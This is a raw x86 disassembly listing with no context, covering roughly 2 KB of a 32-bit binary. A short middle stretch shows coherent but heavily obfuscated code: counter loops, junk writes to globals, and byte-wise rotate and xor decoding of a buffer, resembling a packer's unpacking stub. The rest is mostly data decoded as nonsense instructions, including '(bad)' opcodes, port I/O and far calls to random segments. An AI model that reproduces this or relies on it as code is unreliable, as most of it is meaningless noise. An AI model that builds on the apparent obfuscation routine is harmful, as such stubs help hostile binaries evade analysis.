  4038a6:	dec    ebp
  4038a7:	in     al,0xe5
  4038a9:	jge    0x403903
  4038ab:	fistp  DWORD PTR [ecx+0x28839981]
  4038b1:	pop    edx
  4038b2:	in     eax,dx
  4038b3:	xchg   ebx,eax
  4038b4:	xchg   ebx,eax
  4038b5:	push   ecx
  4038b6:	ficomp WORD PTR [edi-0x707ad7e2]
  4038bc:	out    dx,ax
  4038be:	das    
  4038bf:	fs pusha 
  4038c1:	arpl   WORD PTR [esp+edi*1],bx
  4038c4:	daa    
  4038c5:	stos   BYTE PTR es:[edi],al
  4038c6:	pusha  
  4038c7:	sbb    eax,0x9c415a08
  4038cc:	pop    ds
  4038cd:	leave  
  4038ce:	dec    eax
  4038cf:	inc    ecx
  4038d0:	fabs   
  4038d2:	add    BYTE PTR [edx],bh
  4038d4:	std    
  4038d5:	addr16 dec eax
  4038d7:	jle    0x40385b
  4038d9:	jmp    0x3542cf0d
  4038de:	dec    ebp
  4038df:	add    cl,BYTE PTR [edx+0x12e7cf30]
  4038e5:	add    bh,BYTE PTR [ebx+0x2721b634]
  4038eb:	cmp    al,bl
  4038ed:	retf   
  4038ee:	adc    DWORD PTR [eax+0x61c6d08c],edx
  4038f4:	xchg   edi,eax
  4038f5:	imul   edi,DWORD PTR [ebp-0x1eb35d02],0x17622505
  4038ff:	idiv   DWORD PTR [edi+0xc]
  403902:	push   0x81f04d8b
  403907:	sub    eax,0x426eb9
  40390c:	mov    eax,ds:0x3300426e
  403911:	mov    BYTE PTR [ecx+0x426f2d15],0x0
  403918:	add    eax,0x3300426f
  40391d:	into   
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xcdc4e32d,al
  403bc1:	out    dx,al
  403bc2:	test   DWORD PTR [ecx],ebp
  403bc4:	hlt    
  403bc5:	pushf  
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	lods   al,BYTE PTR ds:[esi]
  403bcd:	ret    0x4dd3
  403bd0:	enter  0xfb48,0x4b
  403bd4:	rcl    DWORD PTR [ebx+0x6f716144],0x8b
  403bdb:	test   DWORD PTR [ecx],edx
  403bdd:	mov    dl,0xd9
  403bdf:	xlat   BYTE PTR ds:[ebx]
  403be0:	scas   eax,DWORD PTR es:[edi]
  403be1:	push   eax
  403be2:	xchg   esp,eax
  403be3:	retf   
  403be4:	xor    DWORD PTR [edi],eax
  403be6:	fdiv   DWORD PTR [edx+0x2f722034]
  403bec:	scas   al,BYTE PTR es:[edi]
  403bed:	fld    QWORD PTR [ebx]
  403bef:	jge    0x403c3c
  403bf1:	mov    ah,0x74
  403bf3:	mov    ch,0xef
  403bf5:	jp     0x403bab
  403bf7:	pop    es
  403bf8:	jp     0x403c50
  403bfa:	pop    edi
  403bfb:	out    dx,al
  403bfc:	int3   
  403bfd:	push   esi
  403bfe:	lods   eax,DWORD PTR ds:[esi]
  403bff:	call   0x1a8e:0x7a85ff63
  403c06:	xchg   esi,eax
  403c07:	sub    DWORD PTR cs:[ebx+0xb6aa567],ebp
  403c0e:	das    
  403c0f:	mov    dh,0xeb
  403c11:	ins    BYTE PTR es:[edi],dx
  403c12:	lea    ebp,[ebx-0x3caa56d1]
  403c18:	lock mov esp,DWORD PTR [ebp+0x27744953]
  403c1f:	mov    dh,dl
  403c21:	repnz pop bp
  403c24:	lods   eax,DWORD PTR ds:[esi]
  403c25:	jb     0x403c38
  403c27:	adc    al,0xeb
  403c29:	push   eax
  403c2a:	inc    eax
  403c2b:	dec    ebp
  403c2c:	aaa    
  403c2d:	retf   
  403c2e:	mov    ecx,0x2828a605
  403c33:	shl    BYTE PTR [esi-0x7e34b94d],cl
  403c39:	lock sahf 
  403c3b:	push   esi
  403c3c:	mov    ds:0x70d99ae3,eax
  403c41:	fcom   QWORD PTR [edx]
  403c43:	jb     0x403c1a
  403c45:	test   al,0x6d
  403c47:	jb     0x403cbb
  403c49:	ins    BYTE PTR es:[edi],dx
  403c4a:	frstor [edx-0x183a4b4d]
  403c50:	push   ebx
  403c51:	icebp  
  403c52:	mov    bl,0xed
  403c54:	mov    WORD PTR [ebp+0x63],ss
  403c57:	jecxz  0x403be8
  403c59:	xchg   edi,eax
  403c5a:	mov    edx,0x9ec9102
  403c5f:	lods   al,BYTE PTR ds:[esi]
  403c60:	jmp    0x403cbd
  403c62:	push   edi
  403c63:	pop    ecx
  403c64:	dec    ebx
  403c65:	gs sbb ecx,0xf7b516d1
  403c6c:	in     eax,dx
  403c6d:	fnstsw WORD PTR [esi]
  403c6f:	ficomp DWORD PTR [eax-0x5b]
  403c72:	dec    edi
  403c73:	js     0x403c91
  403c75:	je     0x403ca4
  403c77:	push   0xffffffd1
  403c79:	pop    esp
  403c7a:	or     DWORD PTR ds:0xaf7eb2f2,ecx
  403c80:	outs   dx,DWORD PTR ds:[esi]
  403c81:	mov    ecx,0x43ea3991
  403c86:	arpl   WORD PTR [esi],dx
  403c88:	lds    ecx,FWORD PTR [ecx]
  403c8a:	ret    0x1b65
  403c8d:	mov    ds:0xc043d2ea,al
  403c92:	push   esi
  403c93:	sbb    DWORD PTR [edx-0x7bc44d18],0x4789ef53
  403c9d:	jns    0x403c7d
  403c9f:	(bad)
  403ca2:	leave  
  403ca3:	nop
  403ca4:	xlat   BYTE PTR ds:[ebx]
  403ca5:	les    ebx,FWORD PTR [ebx-0x26ba34dd]
  403cab:	mov    ch,0x89
  403cad:	mov    ecx,0xb223df86
  403cb2:	mov    WORD PTR [ebx+0x45],?
  403cb5:	jmp    0x97a9312b
  403cba:	sub    BYTE PTR [eax],ah
  403cbc:	xchg   DWORD PTR ds:0x77d66075,ebp
  403cc2:	(bad)  
  403cc4:	dec    esi
  403cc5:	push   ecx
  403cc6:	and    bl,ah
  403cc8:	popa   
  403cc9:	mov    bh,0x38
  403ccb:	pushf  
  403ccc:	or     al,0xbe
  403cce:	ret    
  403ccf:	sbb    edx,DWORD PTR [ecx]
  403cd1:	(bad)  
  403cd2:	stos   BYTE PTR es:[edi],al
  403cd3:	(bad)  [esi]
  403cd5:	sahf   
  403cd6:	int3   
  403cd7:	test   ch,0x30
  403cda:	xor    al,0x21
  403cdc:	jns    0x403cae
  403cde:	inc    ecx
  403cdf:	add    al,0xf1
  403ce1:	loopne 0x403cb1
  403ce3:	loopne 0x403c71
  403ce5:	sbb    DWORD PTR [esi+eax*2],edi
  403ce8:	pop    esi
  403ce9:	adc    DWORD PTR [ecx-0x11],edx
  403cec:	popf   
  403ced:	(bad)  
  403cee:	call   0xb024d8ae
  403cf3:	mov    WORD PTR [esi+edi*8-0x5b8968ba],cs
  403cfa:	xor    esp,DWORD PTR [esp+ebx*4]
  403cfd:	pop    ecx
  403cfe:	shr    dh,0xa2
  403d01:	push   edx
  403d02:	xchg   edi,eax
  403d03:	arpl   WORD PTR [ebx+0x636923f4],ax
  403d09:	retf   
  403d0a:	test   BYTE PTR [esi+eiz*8],al
  403d0d:	dec    ebp
  403d0e:	test   eax,0x5ed082ba
  403d13:	into   
  403d14:	aad    0xf4
  403d16:	mov    DWORD PTR [ebx-0x5d1aca82],eax
  403d1c:	out    dx,al
  403d1d:	in     al,0x31
  403d1f:	and    DWORD PTR [eax-0x13],esp
  403d22:	jb     0x403d96
  403d24:	push   edi
  403d25:	add    eax,0x29e03f1a
  403d2a:	jl     0x403d28
  403d2c:	shr    BYTE PTR [ebx],1
  403d2e:	push   es
  403d2f:	popa   
  403d30:	adc    al,0xfe
  403d32:	out    dx,eax
  403d33:	inc    ebx
  403d34:	and    ebx,DWORD PTR [esi+ebp*4+0x8]
  403d38:	cs or  eax,0xd427fa25
  403d3e:	xchg   ebp,eax
  403d3f:	lods   al,BYTE PTR ds:[esi]
  403d40:	sbb    DWORD PTR [edi+0x4f43802a],ebx
  403d46:	jmp    DWORD PTR [edx-0x71]
  403d49:	ins    BYTE PTR es:[edi],dx
  403d4a:	sub    BYTE PTR [edi],cl
  403d4c:	pop    ebx
  403d4d:	call   0x334d:0x8009a7e8
  403d54:	mov    ch,0xe2
  403d56:	scas   eax,DWORD PTR es:[edi]
  403d57:	fld    DWORD PTR [eax]
  403d59:	mov    bh,0x10
  403d5b:	(bad)  [esi+0x77190558]
  403d61:	jmp    0x403ddb
  403d63:	lods   eax,DWORD PTR ds:[esi]
  403d64:	inc    edi
  403d65:	cmp    DWORD PTR [ebx+0x61],ecx
  403d68:	mov    eax,0x7a7fda0e
  403d6d:	pop    ebp
  403d6e:	dec    ecx
  403d6f:	cmp    dh,BYTE PTR [edx]
  403d71:	mov    eax,0x544ca6ac
  403d76:	retf   
  403d77:	icebp  
  403d78:	repnz sbb edx,DWORD PTR [ebp+0xa]
  403d7c:	jp     0x403d91
  403d7e:	mov    DWORD PTR [esp+ecx*1],esi
  403d81:	mov    es,WORD PTR gs:[eax*2+0x53ad8304]
  403d89:	lahf   
  403d8a:	adc    eax,0x2f419cbe
  403d8f:	push   edi
  403d90:	xchg   ebp,eax
  403d91:	jge    0x403db7
  403d93:	mov    eax,ds:0x1531f990
  403d98:	inc    esp
  403d99:	push   es
  403d9a:	jle    0x403e12
  403d9c:	cmc    
  403d9d:	mov    ah,0x93
  403d9f:	cmp    ch,dh
  403da1:	std    
  403da2:	int    0x3
  403da4:	adc    ebx,ebx
  403da6:	mov    dl,0x22
  403da8:	mov    cl,0x75
  403daa:	add    al,0x17
  403dac:	cld    
  403dad:	shl    BYTE PTR [eax],0xed
  403db0:	sti    
  403db1:	jmp    0x403d87
  403db3:	in     eax,0x93
  403db5:	mov    dh,0x43
  403db7:	bound  ebx,QWORD PTR [edx+ebx*1-0x67]
  403dbb:	in     al,0x36
  403dbd:	sbb    cl,BYTE PTR [edi-0x5cfb7c47]
  403dc3:	aas    
  403dc4:	cdq    
  403dc5:	jae    0x403dd8
  403dc7:	cmp    DWORD PTR [esi],esi
  403dc9:	lods   al,BYTE PTR ds:[esi]
  403dca:	fdiv   QWORD PTR [ebp+0x1a]
  403dcd:	push   eax
  403dce:	and    BYTE PTR [eax-0x69],dl
  403dd1:	nop
  403dd2:	mov    dl,BYTE PTR [ecx]
  403dd4:	shl    BYTE PTR [ecx-0x127f3119],0x18
  403ddb:	fst    DWORD PTR [ecx-0x75]
  403dde:	jno    0x403dd1
  403de0:	push   esi
  403de1:	mov    bl,0x88
  403de3:	jge    0x403d81
  403de5:	sub    DWORD PTR [edx+0x30],ebx
  403de8:	xchg   edi,eax
  403de9:	lods   eax,DWORD PTR ds:[esi]
  403dea:	repz mov al,BYTE PTR [ecx-0x28d90d67]
  403df1:	jb     0x403d97
  403df3:	popa   
  403df4:	jg     0x403e56
  403df6:	xor    BYTE PTR [ebx+eax*1-0x7b],0x7e
  403dfb:	retf   0xbb38
  403dfe:	cmpps  xmm1,XMMWORD PTR [esi-0x1728869c],0xbb
  403e06:	or     DWORD PTR [ebp-0x58],ebp
  403e09:	mov    eax,ds:0x9ccee3d
  403e0e:	clc    
  403e0f:	xchg   ebp,eax
  403e10:	sub    eax,0xfa5fe804
  403e15:	in     al,0x55
  403e17:	aas    
  403e18:	add    al,0xbe
  403e1a:	(bad)  
  403e1b:	imul   edi,DWORD PTR [ecx],0xccdc6da4
  403e21:	adc    al,0xf4
  403e23:	loop   0x403e56
  403e25:	shl    DWORD PTR [ebx-0x1fab0c4a],1
  403e2b:	mov    bh,0x90
  403e2d:	sub    esi,DWORD PTR [ebp+ebx*8-0x7d]
  403e31:	jge    0x403e14
  403e33:	dec    eax
  403e34:	arpl   WORD PTR [eax-0x70],sp
  403e37:	lods   eax,DWORD PTR ds:[esi]
  403e38:	push   ss
  403e39:	xor    bl,0xc9
  403e3c:	scas   al,BYTE PTR es:[edi]
  403e3d:	mov    BYTE PTR [esi],bl
  403e3f:	add    al,0xc8
  403e41:	push   ebx
  403e42:	or     al,0x3b
  403e44:	std    
  403e45:	je     0x403e24
  403e47:	push   esi
  403e48:	dec    ebp
  403e49:	mov    dh,0xdb
  403e4b:	push   0x1d
  403e4d:	push   ds
  403e4e:	test   DWORD PTR [eax+0x1b0a10f0],edi
  403e54:	push   esp
  403e55:	mov    bl,0xfc
  403e57:	adc    DWORD PTR [edi],0x47f99944
  403e5d:	imul   edx,DWORD PTR [ebp+0x29],0x11
  403e61:	xchg   BYTE PTR [edx-0x3fa2f8c4],bh
  403e67:	xor    eax,0x59fce337
  403e6c:	pop    esi
  403e6d:	inc    ecx
  403e6e:	fild   QWORD PTR [edi]
  403e70:	scas   eax,DWORD PTR es:[edi]
  403e71:	pop    ebx
  403e72:	fstp   QWORD PTR [esi]
  403e74:	je     0x403e27
  403e76:	shl    DWORD PTR [ecx],cl
  403e78:	mov    ebx,0x5072c141
  403e7d:	inc    eax
  403e7e:	mov    esp,cs
  403e80:	sbb    al,0xb6
  403e82:	jo     0x403ecf
  403e84:	mov    ds:0xb08c281,eax
  403e89:	mov    edx,0x45faed49
  403e8e:	mov    esi,DWORD PTR [edi+ecx*2-0x661e2ad6]
  403e95:	cwde   
  403e96:	adc    eax,0xa3967e43
  403e9b:	push   esi
  403e9c:	mov    DWORD PTR ds:0x54e773d3,esi
  403ea2:	cmp    al,0xe0
  403ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ea5:	push   edx
  403ea6:	mov    bh,0x2
  403ea8:	jns    0x403ead
  403eaa:	push   ebp
  403eab:	ins    DWORD PTR es:[edi],dx
  403eac:	jp     0x403ecd
  403eae:	out    0x43,al
  403eb0:	jbe    0x403e82
  403eb2:	aas    
  403eb3:	aad    0x2b
  403eb5:	cdq    
  403eb6:	test   BYTE PTR [eax-0x2f8fe445],ah
  403ebc:	out    dx,eax
  403ebd:	pop    esi
  403ebe:	cmc    
  403ebf:	les    ebp,FWORD PTR ds:0xe97062a7
  403ec5:	dec    eax
  403ec6:	adc    BYTE PTR [esi+ebp*8-0x67c4bb26],cl
  403ecd:	push   0x43
  403ecf:	test   DWORD PTR [edi],ebp
  403ed1:	(bad)  
  403ed3:	or     al,0x61
  403ed5:	jmp    0x403f1d
  403ed7:	ret    0x73ff
  403eda:	rcl    DWORD PTR [eax-0x51f37b54],cl
  403ee0:	push   0x8414c4ef
  403ee5:	mov    al,0xad
  403ee7:	jge    0x403f3b
  403ee9:	call   0x5e8f:0xc48b129a
  403ef0:	rol    edx,1
  403ef2:	and    bl,0x5e
  403ef5:	sub    al,0xf5
  403ef7:	jae    0x403f31
  403ef9:	push   ds
  403efa:	or     BYTE PTR ss:[edx+eiz*2+0x248ef6da],ch
  403f02:	loope  0x403ec5
  403f04:	xchg   ebx,eax
  403f05:	cs dec edx
  403f07:	fwait
  403f08:	repz int 0x95
  403f0b:	stos   BYTE PTR es:[edi],al
  403f0c:	fsub   DWORD PTR [ecx-0x6e]
  403f0f:	loop   0x403eb9
  403f11:	sti    
  403f12:	daa    
  403f13:	sbb    ah,BYTE PTR [edx+ebx*2]
  403f16:	pop    es
  403f17:	pushf  
  403f18:	add    eax,0x7b2d9b05
  403f1d:	fsubp  st(0),st
  403f1f:	lds    ecx,FWORD PTR [ebx+0xc]
  403f22:	or     ecx,ecx
  403f24:	fstp   QWORD PTR [ebp+ebp*4+0x672916dc]
  403f2b:	sbb    ecx,DWORD PTR ds:0xe61e1974
  403f31:	mov    ebx,DWORD PTR [ecx-0x7c9cf222]
  403f37:	cmp    eax,0xadf9fe53
  403f3c:	adc    al,BYTE PTR [edx-0x4d0416ed]
  403f42:	adc    DWORD PTR [edi],eax
  403f44:	adc    edi,DWORD PTR [ebp+0x10]
  403f47:	loope  0x403f4b
  403f49:	aaa    
  403f4a:	retf   
  403f4b:	pop    edi
  403f4c:	dec    ebp
  403f4d:	into   
  403f4e:	aad    0xd3
  403f50:	test   BYTE PTR [ebp-0x75],dl
  403f53:	inc    esi
  403f54:	sbb    eax,0x1ec2943d
  403f59:	xor    eax,0xd8f7fb1b
  403f5e:	add    ch,bl
  403f60:	jl     0x403f4b
  403f62:	imul   ecx,DWORD PTR [esp+edx*2-0x24],0x3bc725ad
  403f6a:	retf   
  403f6b:	jb     0x403fc8
  403f6d:	jbe    0x403f01
  403f6f:	mov    esi,0x284134ef
  403f74:	add    al,0x4e
  403f76:	push   esi
  403f77:	xchg   ebp,eax
  403f78:	stc    
  403f79:	(bad)  
  403f7a:	aas    
  403f7b:	or     DWORD PTR [ecx],0x27
  403f7e:	mov    cl,0x40
  403f80:	jle    0x403f4e
  403f82:	popf   
  403f83:	daa    
  403f84:	pop    ecx
  403f85:	lods   al,BYTE PTR ds:[esi]
  403f86:	or     dl,bh
  403f88:	in     eax,0x69
  403f8a:	imul   edx,DWORD PTR [edi+0x30],0xffffffc6
  403f8e:	jmp    0x403f93
  403f90:	inc    esi
  403f91:	scas   eax,DWORD PTR es:[edi]
  403f92:	inc    edi
  403f93:	jo     0x403f86
  403f95:	jnp    0x403fe0
  403f97:	scas   al,BYTE PTR es:[edi]
  403f98:	imul   eax,DWORD PTR [edi+0x713ee30c],0x233c054b
  403fa2:	push   es
  403fa3:	push   cs
  403fa4:	mov    ecx,0xd19d207
  403fa9:	dec    eax
  403faa:	jg     0x403f3e
  403fac:	into   
  403fad:	jge    0x403fa0
  403faf:	repnz cmp BYTE PTR [edi+0x65],0xab
  403fb4:	(bad)  
  403fb5:	ja     0x403fa5
  403fb7:	mov    edx,0xfcae87a6
  403fbc:	ins    BYTE PTR es:[edi],dx
  403fbd:	scas   eax,DWORD PTR es:[edi]
  403fbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fc0:	lock or DWORD PTR cs:[ecx+0x6a4c3b69],eax
  403fc8:	fisubr WORD PTR [edx]
  403fca:	jb     0x403f52
  403fcc:	pop    eax
  403fcd:	sbb    ch,BYTE PTR [esi-0xf]
  403fd0:	sbb    DWORD PTR [edi],edx
  403fd2:	stc    
  403fd3:	icebp  
  403fd4:	push   eax
  403fd5:	xchg   esi,eax
  403fd6:	(bad)  
  403fd7:	jne    0x403fcc
  403fd9:	xor    esp,DWORD PTR [ebp+0x4e]
  403fdc:	repnz cli 
  403fde:	inc    edi
  403fdf:	jle    0x40405a
  403fe1:	fs nop
  403fe3:	test   BYTE PTR [ecx+eiz*4],dl
  403fe6:	inc    ebx
  403fe7:	and    edx,DWORD PTR [esi-0x5496dd6a]
  403fed:	rcl    BYTE PTR [ebx],1
  403fef:	dec    ebp
  403ff0:	push   esi
  403ff1:	fld    DWORD PTR fs:[eax-0x23af561a]
  403ff8:	stos   BYTE PTR es:[edi],al
  403ff9:	test   DWORD PTR [ecx],edx
  403ffb:	fwait
  403ffc:	dec    esi
  403ffd:	push   esp
  403ffe:	or     al,0x68
  404000:	xor    dh,dl
  404002:	fild   QWORD PTR [esi+0x53]
  404005:	call   0x214ee152
  40400a:	cmp    eax,0x2c576136
  40400f:	arpl   WORD PTR [esi],si
  404011:	out    0x46,al
  404013:	sub    BYTE PTR [esi],al
  404015:	shr    DWORD PTR [ecx+0x5a],1
  404018:	aam    0x64
  40401a:	(bad)  
  40401c:	dec    edx
  40401d:	imul   ebx,DWORD PTR [eax-0x7a],0x54ba123b
  404024:	and    eax,0x80a15c7d
  404029:	inc    edi
  40402a:	call   0x57a9a013
  40402f:	mov    WORD PTR [ebp+0x63],fs
  404032:	jne    0x403ff4
  404034:	fcom   QWORD PTR [eax]
  404036:	stc    
  404037:	adc    eax,0xbb127e19
  40403c:	mov    ds:0x637de17a,eax
  404041:	nop
  404042:	mov    dh,0x72
  404044:	lods   eax,DWORD PTR ds:[esi]
  404045:	sub    edi,0x5a57020e
  40404b:	out    0xa1,eax
  40404d:	bound  ebx,QWORD PTR [ecx+0x70]
  404050:	sahf   
  404051:	pop    gs
  404053:	add    eax,0xa2970feb
  404058:	push   esp
  404059:	pop    esp
  40405a:	pusha  
  40405b:	add    BYTE PTR [ebp+0x2d],0x8c
  40405f:	add    bh,BYTE PTR [edx+ebx*2]
  404062:	das    
  404063:	or     al,0x5e
  404065:	mov    cl,BYTE PTR [eax]
  404067:	adc    eax,0x731f6a1c
  40406c:	add    eax,0x59ab6f58
  404071:	fst    QWORD PTR [edx+0x40bb05]
  404077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404078:	and    BYTE PTR [eax],ah
  40407a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40407b:	bound  ecx,QWORD PTR [ecx-0x19]
  40407e:	push   cs
  40407f:	loope  0x404062
  404081:	enter  0x55ec,0xfc
  404085:	jmp    0x40400e
  404087:	dec    BYTE PTR [ebx+0x48]
  40408a:	xor    eax,0x225bc082
  40408f:	or     eax,0x49218dc5
  404094:	xor    BYTE PTR [ebx-0xb],0x91
  404098:	in     al,0xde
  40409a:	xlat   BYTE PTR ds:[ebx]
  40409b:	call   0xb739:0xf3015fa4
  4040a2:	mov    al,0xe9
  4040a4:	sbb    eax,0x31211ec8
  4040a9:	and    BYTE PTR [ebp+0x61],ah
  4040ac:	push   ebp
  4040ad:	jl     0x4040a2
  4040af:	adc    DWORD PTR [ebx],esi
  4040b1:	pop    es
  4040b2:	xchg   esp,eax
  4040b3:	mov    cl,0x67
  4040b5:	ret    
  4040b6:	push   ecx
  4040b7:	xchg   esi,eax
  4040b8:	cmp    DWORD PTR [esi+esi*4],edx
  4040bb:	int3   
  4040bc:	jmp    0xc77c:0x468c722c
  4040c3:	cld    
  4040c4:	sbb    DWORD PTR [ecx-0x5b6945ee],edi
  4040ca:	aas    
  4040cb:	mov    ebx,0x21b372d9
  4040d0:	(bad)  
  4040d1:	pop    ebp
  4040d2:	mov    al,BYTE PTR [ebp-0x5f630a24]
  4040d8:	jns    0x404071
  4040da:	shl    al,cl
  4040dc:	add    esi,DWORD PTR [eax+0x60]
  4040df:	dec    eax
  4040e0:	add    ebx,DWORD PTR [esi]
  4040e2:	xchg   DWORD PTR [ecx],edi
  4040e4:	mov    eax,ds:0xac97ddee
  4040e9:	fdivr  QWORD PTR [ecx+0x6b]
  4040ec:	imul   edx,esi,0x40
  4040ef:	cs jb  0x4040c7
  4040f2:	mov    bh,0xbc
  4040f4:	lods   al,BYTE PTR ds:[esi]
  4040f5:	nop
  4040f6:	and    ebp,DWORD PTR [edx-0x3c]
  4040f9:	fcmove st,st(2)
  4040fb:	scas   al,BYTE PTR es:[edi]
  4040fc:	pushf  
  4040fd:	out    0xfb,al
  4040ff:	int    0xf7
  404101:	(bad)  
  404102:	or     ch,BYTE PTR [eax+ecx*4]
  404105:	data16 fsub st(4),st
  404108:	lock sub eax,0xee3e384d
  40410e:	out    dx,eax
  40410f:	pop    eax
  404110:	ja     0x4040e0
  404112:	mov    ecx,edx
  404114:	fwait
  404115:	or     ebx,DWORD PTR [ecx]
  404117:	jl     0x4040cc
  404119:	in     eax,0x1c
  40411b:	sbb    BYTE PTR [edi-0x539a9f8b],0x5f
  404122:	xchg   BYTE PTR ds:0xfbb6b859,dl
  404128:	leave  
  404129:	sub    BYTE PTR [eax+eax*4+0x62c503be],dl
  404130:	outs   dx,BYTE PTR ds:[esi]
  404131:	cmc    
  404132:	mov    ebx,ebp
  404134:	and    eax,0x62cf5f6a
  404139:	fdiv   QWORD PTR [eax+0x5653ed45]
  40413f:	dec    edi
